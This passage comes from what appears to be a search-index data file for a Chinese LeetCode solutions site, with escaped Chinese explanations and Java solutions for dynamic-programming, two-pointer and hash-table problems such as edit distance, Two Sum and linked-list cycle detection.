public int maxProfit(int k, int[] prices) { int n = prices.length; if (k >= n / 2) { // \u8FD9\u79CD\u60C5\u51B5\u4E0B\u8BE5\u95EE\u9898\u9000\u5316\u4E3A\u666E\u901A\u7684\u80A1\u7968\u4EA4\u6613\u95EE\u9898 int maxProfit = 0; for (int i = 1; i < n; i++) { if (prices[i] > prices[i - 1]) { maxProfit += prices[i] - prices[i - 1]; } } return maxProfit; } int[][] maxProfit = new int[k + 1][n]; for (int i = 1; i <= k; i++) { int localMax = maxProfit[i - 1][0] - prices[0]; for (int j = 1; j < n; j++) { maxProfit[i][j] = Math.max(maxProfit[i][j - 1], prices[j] + localMax); localMax = Math.max(localMax, maxProfit[i - 1][j] - prices[j]); } } return maxProfit[k][n - 1];
}`},{header:"\u5B57\u7B26\u4E32\u7F16\u8F91",slug:"\u5B57\u7B26\u4E32\u7F16\u8F91",content:""},{header:"1. \u5220\u9664\u4E24\u4E2A\u5B57\u7B26\u4E32\u7684\u5B57\u7B26\u4F7F\u5B83\u4EEC\u76F8\u7B49",slug:"_1-\u5220\u9664\u4E24\u4E2A\u5B57\u7B26\u4E32\u7684\u5B57\u7B26\u4F7F\u5B83\u4EEC\u76F8\u7B49",content:`583. Delete Operation for Two Strings (Medium)
Leetcode / \u529B\u6263
Input: "sea", "eat"
Output: 2
Explanation: You need one step to make "sea" to "ea" and another step to make "eat" to "ea".
\u53EF\u4EE5\u8F6C\u6362\u4E3A\u6C42\u4E24\u4E2A\u5B57\u7B26\u4E32\u7684\u6700\u957F\u516C\u5171\u5B50\u5E8F\u5217\u95EE\u9898\u3002
public int minDistance(String word1, String word2) { int m = word1.length(), n = word2.length(); int[][] dp = new int[m + 1][n + 1]; for (int i = 1; i <= m; i++) { for (int j = 1; j <= n; j++) { if (word1.charAt(i - 1) == word2.charAt(j - 1)) { dp[i][j] = dp[i - 1][j - 1] + 1; } else { dp[i][j] = Math.max(dp[i][j - 1], dp[i - 1][j]); } } } return m + n - 2 * dp[m][n];
}`},{header:"2. \u7F16\u8F91\u8DDD\u79BB",slug:"_2-\u7F16\u8F91\u8DDD\u79BB",content:`72. Edit Distance (Hard)
Leetcode / \u529B\u6263
Example 1: Input: word1 = "horse", word2 = "ros"
Output: 3
Explanation:
horse -> rorse (replace 'h' with 'r')
rorse -> rose (remove 'r')
rose -> ros (remove 'e')
Example 2: Input: word1 = "intention", word2 = "execution"
Output: 5
Explanation:
intention -> inention (remove 't')
inention -> enention (replace 'i' with 'e')
enention -> exention (replace 'n' with 'x')
exention -> exection (replace 'n' with 'c')
exection -> execution (insert 'u')
\u9898\u76EE\u63CF\u8FF0\uFF1A\u4FEE\u6539\u4E00\u4E2A\u5B57\u7B26\u4E32\u6210\u4E3A\u53E6\u4E00\u4E2A\u5B57\u7B26\u4E32\uFF0C\u4F7F\u5F97\u4FEE\u6539\u6B21\u6570\u6700\u5C11\u3002\u4E00\u6B21\u4FEE\u6539\u64CD\u4F5C\u5305\u62EC\uFF1A\u63D2\u5165\u4E00\u4E2A\u5B57\u7B26\u3001\u5220\u9664\u4E00\u4E2A\u5B57\u7B26\u3001\u66FF\u6362\u4E00\u4E2A\u5B57\u7B26\u3002
public int minDistance(String word1, String word2) { if (word1 == null || word2 == null) { return 0; } int m = word1.length(), n = word2.length(); int[][] dp = new int[m + 1][n + 1]; for (int i = 1; i <= m; i++) { dp[i][0] = i; } for (int i = 1; i <= n; i++) { dp[0][i] = i; } for (int i = 1; i <= m; i++) { for (int j = 1; j <= n; j++) { if (word1.charAt(i - 1) == word2.charAt(j - 1)) { dp[i][j] = dp[i - 1][j - 1]; } else { dp[i][j] = Math.min(dp[i - 1][j - 1], Math.min(dp[i][j - 1], dp[i - 1][j])) + 1; } } } return dp[m][n];
}`},{header:"3. \u590D\u5236\u7C98\u8D34\u5B57\u7B26",slug:"_3-\u590D\u5236\u7C98\u8D34\u5B57\u7B26",content:`650. 2 Keys Keyboard (Medium)
Leetcode / \u529B\u6263
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6700\u5F00\u59CB\u53EA\u6709\u4E00\u4E2A\u5B57\u7B26 A\uFF0C\u95EE\u9700\u8981\u591A\u5C11\u6B21\u64CD\u4F5C\u80FD\u591F\u5F97\u5230 n \u4E2A\u5B57\u7B26 A\uFF0C\u6BCF\u6B21\u64CD\u4F5C\u53EF\u4EE5\u590D\u5236\u5F53\u524D\u6240\u6709\u7684\u5B57\u7B26\uFF0C\u6216\u8005\u7C98\u8D34\u3002
Input: 3
Output: 3
Explanation:
Intitally, we have one character 'A'.
In step 1, we use Copy All operation.
In step 2, we use Paste operation to get 'AA'.
In step 3, we use Paste operation to get 'AAA'.
public int minSteps(int n) { if (n == 1) return 0; for (int i = 2; i <= Math.sqrt(n); i++) { if (n % i == 0) return i + minSteps(n / i); } return n;
}
public int minSteps(int n) { int[] dp = new int[n + 1]; int h = (int) Math.sqrt(n); for (int i = 2; i <= n; i++) { dp[i] = i; for (int j = 2; j <= h; j++) { if (i % j == 0) { dp[i] = dp[j] + dp[i / j]; break; } } } return dp[n];
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%8F%8C%E6%8C%87%E9%92%88.html",title:"Leetcode \u9898\u89E3 - \u53CC\u6307\u9488",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u53CC\u6307\u9488",slug:"leetcode-\u9898\u89E3-\u53CC\u6307\u9488",content:`Leetcode \u9898\u89E3 - \u53CC\u6307\u9488 1. \u6709\u5E8F\u6570\u7EC4\u7684 Two Sum
2. \u4E24\u6570\u5E73\u65B9\u548C
3. \u53CD\u8F6C\u5B57\u7B26\u4E32\u4E2D\u7684\u5143\u97F3\u5B57\u7B26
4. \u56DE\u6587\u5B57\u7B26\u4E32
5. \u5F52\u5E76\u4E24\u4E2A\u6709\u5E8F\u6570\u7EC4
6. \u5224\u65AD\u94FE\u8868\u662F\u5426\u5B58\u5728\u73AF
7. \u6700\u957F\u5B50\u5E8F\u5217 \u53CC\u6307\u9488\u4E3B\u8981\u7528\u4E8E\u904D\u5386\u6570\u7EC4\uFF0C\u4E24\u4E2A\u6307\u9488\u6307\u5411\u4E0D\u540C\u7684\u5143\u7D20\uFF0C\u4ECE\u800C\u534F\u540C\u5B8C\u6210\u4EFB\u52A1\u3002`},{header:"1. \u6709\u5E8F\u6570\u7EC4\u7684 Two Sum",slug:"_1-\u6709\u5E8F\u6570\u7EC4\u7684-two-sum",content:`167. Two Sum II - Input array is sorted (Easy)
Leetcode / \u529B\u6263
Input: numbers={2, 7, 11, 15}, target=9
Output: index1=1, index2=2
\u9898\u76EE\u63CF\u8FF0\uFF1A\u5728\u6709\u5E8F\u6570\u7EC4\u4E2D\u627E\u51FA\u4E24\u4E2A\u6570\uFF0C\u4F7F\u5B83\u4EEC\u7684\u548C\u4E3A target\u3002
\u4F7F\u7528\u53CC\u6307\u9488\uFF0C\u4E00\u4E2A\u6307\u9488\u6307\u5411\u503C\u8F83\u5C0F\u7684\u5143\u7D20\uFF0C\u4E00\u4E2A\u6307\u9488\u6307\u5411\u503C\u8F83\u5927\u7684\u5143\u7D20\u3002\u6307\u5411\u8F83\u5C0F\u5143\u7D20\u7684\u6307\u9488\u4ECE\u5934\u5411\u5C3E\u904D\u5386\uFF0C\u6307\u5411\u8F83\u5927\u5143\u7D20\u7684\u6307\u9488\u4ECE\u5C3E\u5411\u5934\u904D\u5386\u3002 \u5982\u679C\u4E24\u4E2A\u6307\u9488\u6307\u5411\u5143\u7D20\u7684\u548C sum == target\uFF0C\u90A3\u4E48\u5F97\u5230\u8981\u6C42\u7684\u7ED3\u679C\uFF1B
\u5982\u679C sum > target\uFF0C\u79FB\u52A8\u8F83\u5927\u7684\u5143\u7D20\uFF0C\u4F7F sum \u53D8\u5C0F\u4E00\u4E9B\uFF1B
\u5982\u679C sum < target\uFF0C\u79FB\u52A8\u8F83\u5C0F\u7684\u5143\u7D20\uFF0C\u4F7F sum \u53D8\u5927\u4E00\u4E9B\u3002 \u6570\u7EC4\u4E2D\u7684\u5143\u7D20\u6700\u591A\u904D\u5386\u4E00\u6B21\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\u3002\u53EA\u4F7F\u7528\u4E86\u4E24\u4E2A\u989D\u5916\u53D8\u91CF\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6\u4E3A O(1)\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/437cb54c-5970-4ba9-b2ef-2541f7d6c81e.gif" width="200px">
public int[] twoSum(int[] numbers, int target) { if (numbers == null) return null; int i = 0, j = numbers.length - 1; while (i < j) { int sum = numbers[i] + numbers[j]; if (sum == target) { return new int[]{i + 1, j + 1}; } else if (sum < target) { i++; } else { j--; } } return null;
}`},{header:"2. \u4E24\u6570\u5E73\u65B9\u548C",slug:"_2-\u4E24\u6570\u5E73\u65B9\u548C",content:`633. Sum of Square Numbers (Easy)
Leetcode / \u529B\u6263
Input: 5
Output: True
Explanation: 1 * 1 + 2 * 2 = 5
\u9898\u76EE\u63CF\u8FF0\uFF1A\u5224\u65AD\u4E00\u4E2A\u975E\u8D1F\u6574\u6570\u662F\u5426\u4E3A\u4E24\u4E2A\u6574\u6570\u7684\u5E73\u65B9\u548C\u3002
\u53EF\u4EE5\u770B\u6210\u662F\u5728\u5143\u7D20\u4E3A 0~target \u7684\u6709\u5E8F\u6570\u7EC4\u4E2D\u67E5\u627E\u4E24\u4E2A\u6570\uFF0C\u4F7F\u5F97\u8FD9\u4E24\u4E2A\u6570\u7684\u5E73\u65B9\u548C\u4E3A target\uFF0C\u5982\u679C\u80FD\u627E\u5230\uFF0C\u5219\u8FD4\u56DE true\uFF0C\u8868\u793A target \u662F\u4E24\u4E2A\u6574\u6570\u7684\u5E73\u65B9\u548C\u3002
\u672C\u9898\u548C 167. Two Sum II - Input array is sorted \u7C7B\u4F3C\uFF0C\u53EA\u6709\u4E00\u4E2A\u660E\u663E\u533A\u522B\uFF1A\u4E00\u4E2A\u662F\u548C\u4E3A target\uFF0C\u4E00\u4E2A\u662F\u5E73\u65B9\u548C\u4E3A target\u3002\u672C\u9898\u540C\u6837\u53EF\u4EE5\u4F7F\u7528\u53CC\u6307\u9488\u5F97\u5230\u4E24\u4E2A\u6570\uFF0C\u4F7F\u5176\u5E73\u65B9\u548C\u4E3A target\u3002
\u672C\u9898\u7684\u5173\u952E\u662F\u53F3\u6307\u9488\u7684\u521D\u59CB\u5316\uFF0C\u5B9E\u73B0\u526A\u679D\uFF0C\u4ECE\u800C\u964D\u4F4E\u65F6\u95F4\u590D\u6742\u5EA6\u3002\u8BBE\u53F3\u6307\u9488\u4E3A x\uFF0C\u5DE6\u6307\u9488\u56FA\u5B9A\u4E3A 0\uFF0C\u4E3A\u4E86\u4F7F 02 + x2 \u7684\u503C\u5C3D\u53EF\u80FD\u63A5\u8FD1 target\uFF0C\u6211\u4EEC\u53EF\u4EE5\u5C06 x \u53D6\u4E3A sqrt(target)\u3002
\u56E0\u4E3A\u6700\u591A\u53EA\u9700\u8981\u904D\u5386\u4E00\u6B21 0~sqrt(target)\uFF0C\u6240\u4EE5\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(sqrt(target))\u3002\u53C8\u56E0\u4E3A\u53EA\u4F7F\u7528\u4E86\u4E24\u4E2A\u989D\u5916\u7684\u53D8\u91CF\uFF0C\u56E0\u6B64\u7A7A\u95F4\u590D\u6742\u5EA6\u4E3A O(1)\u3002 public boolean judgeSquareSum(int target) { if (target < 0) return false; int i = 0, j = (int) Math.sqrt(target); while (i <= j) { int powSum = i * i + j * j; if (powSum == target) { return true; } else if (powSum > target) { j--; } else { i++; } } return false; }`},{header:"3. \u53CD\u8F6C\u5B57\u7B26\u4E32\u4E2D\u7684\u5143\u97F3\u5B57\u7B26",slug:"_3-\u53CD\u8F6C\u5B57\u7B26\u4E32\u4E2D\u7684\u5143\u97F3\u5B57\u7B26",content:`345. Reverse Vowels of a String (Easy)
Leetcode / \u529B\u6263
Given s = "leetcode", return "leotcede".
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a7cb8423-895d-4975-8ef8-662a0029c772.png" width="400px">
\u4F7F\u7528\u53CC\u6307\u9488\uFF0C\u4E00\u4E2A\u6307\u9488\u4ECE\u5934\u5411\u5C3E\u904D\u5386\uFF0C\u4E00\u4E2A\u6307\u9488\u4ECE\u5C3E\u5230\u5934\u904D\u5386\uFF0C\u5F53\u4E24\u4E2A\u6307\u9488\u90FD\u904D\u5386\u5230\u5143\u97F3\u5B57\u7B26\u65F6\uFF0C\u4EA4\u6362\u8FD9\u4E24\u4E2A\u5143\u97F3\u5B57\u7B26\u3002
\u4E3A\u4E86\u5FEB\u901F\u5224\u65AD\u4E00\u4E2A\u5B57\u7B26\u662F\u4E0D\u662F\u5143\u97F3\u5B57\u7B26\uFF0C\u6211\u4EEC\u5C06\u5168\u90E8\u5143\u97F3\u5B57\u7B26\u6DFB\u52A0\u5230\u96C6\u5408 HashSet \u4E2D\uFF0C\u4ECE\u800C\u4EE5 O(1) \u7684\u65F6\u95F4\u590D\u6742\u5EA6\u8FDB\u884C\u8BE5\u64CD\u4F5C\u3002 \u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\uFF1A\u53EA\u9700\u8981\u904D\u5386\u6240\u6709\u5143\u7D20\u4E00\u6B21
\u7A7A\u95F4\u590D\u6742\u5EA6 O(1)\uFF1A\u53EA\u9700\u8981\u4F7F\u7528\u4E24\u4E2A\u989D\u5916\u53D8\u91CF ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ef25ff7c-0f63-420d-8b30-eafbeea35d11.gif" width="400px">
private final static HashSet<Character> vowels = new HashSet<>( Arrays.asList('a', 'e', 'i', 'o', 'u', 'A', 'E', 'I', 'O', 'U')); public String reverseVowels(String s) { if (s == null) return null; int i = 0, j = s.length() - 1; char[] result = new char[s.length()]; while (i <= j) { char ci = s.charAt(i); char cj = s.charAt(j); if (!vowels.contains(ci)) { result[i++] = ci; } else if (!vowels.contains(cj)) { result[j--] = cj; } else { result[i++] = cj; result[j--] = ci; } } return new String(result);
}`},{header:"4. \u56DE\u6587\u5B57\u7B26\u4E32",slug:"_4-\u56DE\u6587\u5B57\u7B26\u4E32",content:`680. Valid Palindrome II (Easy)
Leetcode / \u529B\u6263
Input: "abca"
Output: True
Explanation: You could delete the character 'c'.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u53EF\u4EE5\u5220\u9664\u4E00\u4E2A\u5B57\u7B26\uFF0C\u5224\u65AD\u662F\u5426\u80FD\u6784\u6210\u56DE\u6587\u5B57\u7B26\u4E32\u3002
\u6240\u8C13\u7684\u56DE\u6587\u5B57\u7B26\u4E32\uFF0C\u662F\u6307\u5177\u6709\u5DE6\u53F3\u5BF9\u79F0\u7279\u70B9\u7684\u5B57\u7B26\u4E32\uFF0C\u4F8B\u5982 "abcba" \u5C31\u662F\u4E00\u4E2A\u56DE\u6587\u5B57\u7B26\u4E32\u3002
\u4F7F\u7528\u53CC\u6307\u9488\u53EF\u4EE5\u5F88\u5BB9\u6613\u5224\u65AD\u4E00\u4E2A\u5B57\u7B26\u4E32\u662F\u5426\u662F\u56DE\u6587\u5B57\u7B26\u4E32\uFF1A\u4EE4\u4E00\u4E2A\u6307\u9488\u4ECE\u5DE6\u5230\u53F3\u904D\u5386\uFF0C\u4E00\u4E2A\u6307\u9488\u4ECE\u53F3\u5230\u5DE6\u904D\u5386\uFF0C\u8FD9\u4E24\u4E2A\u6307\u9488\u540C\u65F6\u79FB\u52A8\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u6BCF\u6B21\u90FD\u5224\u65AD\u4E24\u4E2A\u6307\u9488\u6307\u5411\u7684\u5B57\u7B26\u662F\u5426\u76F8\u540C\uFF0C\u5982\u679C\u90FD\u76F8\u540C\uFF0C\u5B57\u7B26\u4E32\u624D\u662F\u5177\u6709\u5DE6\u53F3\u5BF9\u79F0\u6027\u8D28\u7684\u56DE\u6587\u5B57\u7B26\u4E32\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fcc941ec-134b-4dcd-bc86-1702fd305300.gif" width="250px">
\u672C\u9898\u7684\u5173\u952E\u662F\u5904\u7406\u5220\u9664\u4E00\u4E2A\u5B57\u7B26\u3002\u5728\u4F7F\u7528\u53CC\u6307\u9488\u904D\u5386\u5B57\u7B26\u4E32\u65F6\uFF0C\u5982\u679C\u51FA\u73B0\u4E24\u4E2A\u6307\u9488\u6307\u5411\u7684\u5B57\u7B26\u4E0D\u76F8\u7B49\u7684\u60C5\u51B5\uFF0C\u6211\u4EEC\u5C31\u8BD5\u7740\u5220\u9664\u4E00\u4E2A\u5B57\u7B26\uFF0C\u518D\u5224\u65AD\u5220\u9664\u5B8C\u4E4B\u540E\u7684\u5B57\u7B26\u4E32\u662F\u5426\u662F\u56DE\u6587\u5B57\u7B26\u4E32\u3002
\u5728\u5224\u65AD\u662F\u5426\u4E3A\u56DE\u6587\u5B57\u7B26\u4E32\u65F6\uFF0C\u6211\u4EEC\u4E0D\u9700\u8981\u5224\u65AD\u6574\u4E2A\u5B57\u7B26\u4E32\uFF0C\u56E0\u4E3A\u5DE6\u6307\u9488\u5DE6\u8FB9\u548C\u53F3\u6307\u9488\u53F3\u8FB9\u7684\u5B57\u7B26\u4E4B\u524D\u5DF2\u7ECF\u5224\u65AD\u8FC7\u5177\u6709\u5BF9\u79F0\u6027\u8D28\uFF0C\u6240\u4EE5\u53EA\u9700\u8981\u5224\u65AD\u4E2D\u95F4\u7684\u5B50\u5B57\u7B26\u4E32\u5373\u53EF\u3002
\u5728\u8BD5\u7740\u5220\u9664\u5B57\u7B26\u65F6\uFF0C\u6211\u4EEC\u65E2\u53EF\u4EE5\u5220\u9664\u5DE6\u6307\u9488\u6307\u5411\u7684\u5B57\u7B26\uFF0C\u4E5F\u53EF\u4EE5\u5220\u9664\u53F3\u6307\u9488\u6307\u5411\u7684\u5B57\u7B26\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/db5f30a7-8bfa-4ecc-ab5d-747c77818964.gif" width="300px">
public boolean validPalindrome(String s) { for (int i = 0, j = s.length() - 1; i < j; i++, j--) { if (s.charAt(i) != s.charAt(j)) { return isPalindrome(s, i, j - 1) || isPalindrome(s, i + 1, j); } } return true;
} private boolean isPalindrome(String s, int i, int j) { while (i < j) { if (s.charAt(i++) != s.charAt(j--)) { return false; } } return true;
}`},{header:"5. \u5F52\u5E76\u4E24\u4E2A\u6709\u5E8F\u6570\u7EC4",slug:"_5-\u5F52\u5E76\u4E24\u4E2A\u6709\u5E8F\u6570\u7EC4",content:`88. Merge Sorted Array (Easy)
Leetcode / \u529B\u6263
Input:
nums1 = [1,2,3,0,0,0], m = 3
nums2 = [2,5,6], n = 3 Output: [1,2,2,3,5,6]
\u9898\u76EE\u63CF\u8FF0\uFF1A\u628A\u5F52\u5E76\u7ED3\u679C\u5B58\u5230\u7B2C\u4E00\u4E2A\u6570\u7EC4\u4E0A\u3002
\u9700\u8981\u4ECE\u5C3E\u5F00\u59CB\u904D\u5386\uFF0C\u5426\u5219\u5728 nums1 \u4E0A\u5F52\u5E76\u5F97\u5230\u7684\u503C\u4F1A\u8986\u76D6\u8FD8\u672A\u8FDB\u884C\u5F52\u5E76\u6BD4\u8F83\u7684\u503C\u3002
public void merge(int[] nums1, int m, int[] nums2, int n) { int index1 = m - 1, index2 = n - 1; int indexMerge = m + n - 1; while (index2 >= 0) { if (index1 < 0) { nums1[indexMerge--] = nums2[index2--]; } else if (index2 < 0) { nums1[indexMerge--] = nums1[index1--]; } else if (nums1[index1] > nums2[index2]) { nums1[indexMerge--] = nums1[index1--]; } else { nums1[indexMerge--] = nums2[index2--]; } }
}`},{header:"6. \u5224\u65AD\u94FE\u8868\u662F\u5426\u5B58\u5728\u73AF",slug:"_6-\u5224\u65AD\u94FE\u8868\u662F\u5426\u5B58\u5728\u73AF",content:`141. Linked List Cycle (Easy)
Leetcode / \u529B\u6263
\u4F7F\u7528\u53CC\u6307\u9488\uFF0C\u4E00\u4E2A\u6307\u9488\u6BCF\u6B21\u79FB\u52A8\u4E00\u4E2A\u8282\u70B9\uFF0C\u4E00\u4E2A\u6307\u9488\u6BCF\u6B21\u79FB\u52A8\u4E24\u4E2A\u8282\u70B9\uFF0C\u5982\u679C\u5B58\u5728\u73AF\uFF0C\u90A3\u4E48\u8FD9\u4E24\u4E2A\u6307\u9488\u4E00\u5B9A\u4F1A\u76F8\u9047\u3002
public boolean hasCycle(ListNode head) { if (head == null) { return false; } ListNode l1 = head, l2 = head.next; while (l1 != null && l2 != null && l2.next != null) { if (l1 == l2) { return true; } l1 = l1.next; l2 = l2.next.next; } return false;
}`},{header:"7. \u6700\u957F\u5B50\u5E8F\u5217",slug:"_7-\u6700\u957F\u5B50\u5E8F\u5217",content:`524. Longest Word in Dictionary through Deleting (Medium)
Leetcode / \u529B\u6263
Input:
s = "abpcplea", d = ["ale","apple","monkey","plea"] Output:
"apple"
\u9898\u76EE\u63CF\u8FF0\uFF1A\u5220\u9664 s \u4E2D\u7684\u4E00\u4E9B\u5B57\u7B26\uFF0C\u4F7F\u5F97\u5B83\u6784\u6210\u5B57\u7B26\u4E32\u5217\u8868 d \u4E2D\u7684\u4E00\u4E2A\u5B57\u7B26\u4E32\uFF0C\u627E\u51FA\u80FD\u6784\u6210\u7684\u6700\u957F\u5B57\u7B26\u4E32\u3002\u5982\u679C\u6709\u591A\u4E2A\u76F8\u540C\u957F\u5EA6\u7684\u7ED3\u679C\uFF0C\u8FD4\u56DE\u5B57\u5178\u5E8F\u7684\u6700\u5C0F\u5B57\u7B26\u4E32\u3002
\u901A\u8FC7\u5220\u9664\u5B57\u7B26\u4E32 s \u4E2D\u7684\u4E00\u4E2A\u5B57\u7B26\u80FD\u5F97\u5230\u5B57\u7B26\u4E32 t\uFF0C\u53EF\u4EE5\u8BA4\u4E3A t \u662F s \u7684\u5B50\u5E8F\u5217\uFF0C\u6211\u4EEC\u53EF\u4EE5\u4F7F\u7528\u53CC\u6307\u9488\u6765\u5224\u65AD\u4E00\u4E2A\u5B57\u7B26\u4E32\u662F\u5426\u4E3A\u53E6\u4E00\u4E2A\u5B57\u7B26\u4E32\u7684\u5B50\u5E8F\u5217\u3002
public String findLongestWord(String s, List<String> d) { String longestWord = ""; for (String target : d) { int l1 = longestWord.length(), l2 = target.length(); if (l1 > l2 || (l1 == l2 && longestWord.compareTo(target) < 0)) { continue; } if (isSubstr(s, target)) { longestWord = target; } } return longestWord;
} private boolean isSubstr(String s, String target) { int i = 0, j = 0; while (i < s.length() && j < target.length()) { if (s.charAt(i) == target.charAt(j)) { j++; } i++; } return j == target.length();
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%93%88%E5%B8%8C%E8%A1%A8.html",title:"Leetcode \u9898\u89E3 - \u54C8\u5E0C\u8868",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u54C8\u5E0C\u8868",slug:"leetcode-\u9898\u89E3-\u54C8\u5E0C\u8868",content:`Leetcode \u9898\u89E3 - \u54C8\u5E0C\u8868 1. \u6570\u7EC4\u4E2D\u4E24\u4E2A\u6570\u7684\u548C\u4E3A\u7ED9\u5B9A\u503C
2. \u5224\u65AD\u6570\u7EC4\u662F\u5426\u542B\u6709\u91CD\u590D\u5143\u7D20
3. \u6700\u957F\u548C\u8C10\u5E8F\u5217
4. \u6700\u957F\u8FDE\u7EED\u5E8F\u5217 \u54C8\u5E0C\u8868\u4F7F\u7528 O(N) \u7A7A\u95F4\u590D\u6742\u5EA6\u5B58\u50A8\u6570\u636E\uFF0C\u5E76\u4E14\u4EE5 O(1) \u65F6\u95F4\u590D\u6742\u5EA6\u6C42\u89E3\u95EE\u9898\u3002 Java \u4E2D\u7684 HashSet \u7528\u4E8E\u5B58\u50A8\u4E00\u4E2A\u96C6\u5408\uFF0C\u53EF\u4EE5\u67E5\u627E\u5143\u7D20\u662F\u5426\u5728\u96C6\u5408\u4E2D\u3002\u5982\u679C\u5143\u7D20\u6709\u7A77\uFF0C\u5E76\u4E14\u8303\u56F4\u4E0D\u5927\uFF0C\u90A3\u4E48\u53EF\u4EE5\u7528\u4E00\u4E2A\u5E03\u5C14\u6570\u7EC4\u6765\u5B58\u50A8\u4E00\u4E2A\u5143\u7D20\u662F\u5426\u5B58\u5728\u3002\u4F8B\u5982\u5BF9\u4E8E\u53EA\u6709\u5C0F\u5199\u5B57\u7B26\u7684\u5143\u7D20\uFF0C\u5C31\u53EF\u4EE5\u7528\u4E00\u4E2A\u957F\u5EA6\u4E3A 26 \u7684\u5E03\u5C14\u6570\u7EC4\u6765\u5B58\u50A8\u4E00\u4E2A\u5B57\u7B26\u96C6\u5408\uFF0C\u4F7F\u5F97\u7A7A\u95F4\u590D\u6742\u5EA6\u964D\u4F4E\u4E3A O(1)\u3002 Java \u4E2D\u7684 HashMap \u4E3B\u8981\u7528\u4E8E\u6620\u5C04\u5173\u7CFB\uFF0C\u4ECE\u800C\u628A\u4E24\u4E2A\u5143\u7D20\u8054\u7CFB\u8D77\u6765\u3002HashMap \u4E5F\u53EF\u4EE5\u7528\u6765\u5BF9\u5143\u7D20\u8FDB\u884C\u8BA1\u6570\u7EDF\u8BA1\uFF0C\u6B64\u65F6\u952E\u4E3A\u5143\u7D20\uFF0C\u503C\u4E3A\u8BA1\u6570\u3002\u548C HashSet \u7C7B\u4F3C\uFF0C\u5982\u679C\u5143\u7D20\u6709\u7A77\u5E76\u4E14\u8303\u56F4\u4E0D\u5927\uFF0C\u53EF\u4EE5\u7528\u6574\u578B\u6570\u7EC4\u6765\u8FDB\u884C\u7EDF\u8BA1\u3002\u5728\u5BF9\u4E00\u4E2A\u5185\u5BB9\u8FDB\u884C\u538B\u7F29\u6216\u8005\u5176\u5B83\u8F6C\u6362\u65F6\uFF0C\u5229\u7528 HashMap \u53EF\u4EE5\u628A\u539F\u59CB\u5185\u5BB9\u548C\u8F6C\u6362\u540E\u7684\u5185\u5BB9\u8054\u7CFB\u8D77\u6765\u3002\u4F8B\u5982\u5728\u4E00\u4E2A\u7B80\u5316 url \u7684\u7CFB\u7EDF\u4E2D [Leetcdoe : 535. Encode and Decode TinyURL (Medium)
Leetcode\uFF0C\u5229\u7528 HashMap \u5C31\u53EF\u4EE5\u5B58\u50A8\u7CBE\u7B80\u540E\u7684 url \u5230\u539F\u59CB url \u7684\u6620\u5C04\uFF0C\u4F7F\u5F97\u4E0D\u4EC5\u53EF\u4EE5\u663E\u793A\u7B80\u5316\u7684 url\uFF0C\u4E5F\u53EF\u4EE5\u6839\u636E\u7B80\u5316\u7684 url \u5F97\u5230\u539F\u59CB url \u4ECE\u800C\u5B9A\u4F4D\u5230\u6B63\u786E\u7684\u8D44\u6E90\uFFFD) / \u529B\u6263\uFF0C\u5229\u7528 HashMap \u5C31\u53EF\u4EE5\u5B58\u50A8\u7CBE\u7B80\u540E\u7684 url \u5230\u539F\u59CB url \u7684\u6620\u5C04\uFF0C\u4F7F\u5F97\u4E0D\u4EC5\u53EF\u4EE5\u663E\u793A\u7B80\u5316\u7684 url\uFF0C\u4E5F\u53EF\u4EE5\u6839\u636E\u7B80\u5316\u7684 url \u5F97\u5230\u539F\u59CB url \u4ECE\u800C\u5B9A\u4F4D\u5230\u6B63\u786E\u7684\u8D44\u6E90\uFFFD)`},{header:"1. \u6570\u7EC4\u4E2D\u4E24\u4E2A\u6570\u7684\u548C\u4E3A\u7ED9\u5B9A\u503C",slug:"_1-\u6570\u7EC4\u4E2D\u4E24\u4E2A\u6570\u7684\u548C\u4E3A\u7ED9\u5B9A\u503C",content:`1. Two Sum (Easy)
Leetcode / \u529B\u6263
\u53EF\u4EE5\u5148\u5BF9\u6570\u7EC4\u8FDB\u884C\u6392\u5E8F\uFF0C\u7136\u540E\u4F7F\u7528\u53CC\u6307\u9488\u65B9\u6CD5\u6216\u8005\u4E8C\u5206\u67E5\u627E\u65B9\u6CD5\u3002\u8FD9\u6837\u505A\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(NlogN)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6\u4E3A O(1)\u3002
\u7528 HashMap \u5B58\u50A8\u6570\u7EC4\u5143\u7D20\u548C\u7D22\u5F15\u7684\u6620\u5C04\uFF0C\u5728\u8BBF\u95EE\u5230 nums[i] \u65F6\uFF0C\u5224\u65AD HashMap \u4E2D\u662F\u5426\u5B58\u5728 target - nums[i]\uFF0C\u5982\u679C\u5B58\u5728\u8BF4\u660E target - nums[i] \u6240\u5728\u7684\u7D22\u5F15\u548C i \u5C31\u662F\u8981\u627E\u7684\u4E24\u4E2A\u6570\u3002\u8BE5\u65B9\u6CD5\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\uFF0C\u4F7F\u7528\u7A7A\u95F4\u6765\u6362\u53D6\u65F6\u95F4\u3002
public int[] twoSum(int[] nums, int target) { HashMap<Integer, Integer> indexForNum = new HashMap<>(); for (int i = 0; i < nums.length; i++) { if (indexForNum.containsKey(target - nums[i])) { return new int[]{indexForNum.get(target - nums[i]), i}; } else { indexForNum.put(nums[i], i); } } return null;
}`},{header:"2. \u5224\u65AD\u6570\u7EC4\u662F\u5426\u542B\u6709\u91CD\u590D\u5143\u7D20",slug:"_2-\u5224\u65AD\u6570\u7EC4\u662F\u5426\u542B\u6709\u91CD\u590D\u5143\u7D20",content:`217. Contains Duplicate (Easy)
